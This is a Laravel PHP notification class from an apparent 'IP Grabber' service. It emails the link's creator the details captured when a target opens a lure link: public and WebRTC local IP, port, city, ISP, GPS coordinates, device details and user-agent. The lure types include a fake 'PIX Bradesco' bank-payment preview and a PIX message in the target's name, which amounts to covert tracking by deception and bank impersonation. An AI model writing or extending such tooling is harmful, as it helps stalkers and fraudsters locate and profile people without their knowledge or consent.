<?php

namespace App\Notifications;

use App\Models\IpGrabberAccess;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;

class IpGrabberAccessCapturedNotification extends Notification
{
    public function __construct(private readonly IpGrabberAccess $access)
    {
    }

    public function via(object $notifiable): array
    {
        return ['mail'];
    }

    public function toMail(object $notifiable): MailMessage
    {
        $access = $this->access->refresh()->loadMissing('ipGrabber');
        $ipGrabber = $access->ipGrabber;
        $timezone = config('app.timezone', 'America/Sao_Paulo');
        $accessedAt = $access->accessed_at
            ? $access->accessed_at->timezone($timezone)->format('d/m/Y H:i:s')
            : now($timezone)->format('d/m/Y H:i:s');

        return (new MailMessage)
            ->subject('IP Grabber capturado - ' . config('app.name'))
            ->view('emails.ip-grabber-access-captured', [
                'subject' => 'IP Grabber capturado - ' . config('app.name'),
                'title' => 'IP Grabber capturado',
                'openingLine' => 'Um link de IP Grabber criado por você recebeu um acesso válido.',
                'details' => [
                    'Identificação' => $ipGrabber?->label ?: '-',
                    'Data e hora' => $accessedAt . " ({$timezone})",
                    'Tipo de link' => match ($ipGrabber?->preview_tipo) {
                        'noticia' => 'Notícia externa',
                        'pix_bradesco' => 'PIX Bradesco',
                        'pix_nome_alvo' => 'PIX em nome do alvo',
                        default => 'Mensagem Customizada',
                    },
                    'URL da notícia' => $ipGrabber?->noticia_url ?: '-',
                    'IP público' => $access->ip ?: '-',
                    'Porta de origem' => $access->porta ?: '-',
                    'IP local/WebRTC' => $access->ip_local ?: '-',
                    'GMT/Fuso' => $access->gmt ?: '-',
                    'Cidade' => $access->cidade ?: '-',
                    'Região' => $access->regiao ?: '-',
                    'País' => $access->pais ?: '-',
                    'ISP/Operadora' => $access->isp ?: '-',
                    'GPS autorizado' => $access->gps_latitude !== null
                        ? "{$access->gps_latitude}, {$access->gps_longitude}"
                        : '-',
                    'Precisão GPS' => $access->gps_accuracy !== null ? "{$access->gps_accuracy} m" : '-',
                    'Idioma' => $access->idioma ?: '-',
                    'Plataforma' => $access->plataforma ?: '-',
                    'Resolução' => $access->resolucao ?: '-',
                    'Referer' => $access->referer ?: '-',
                    'User-Agent' => $access->user_agent ?: '-',
                ],
            ]);
    }
}
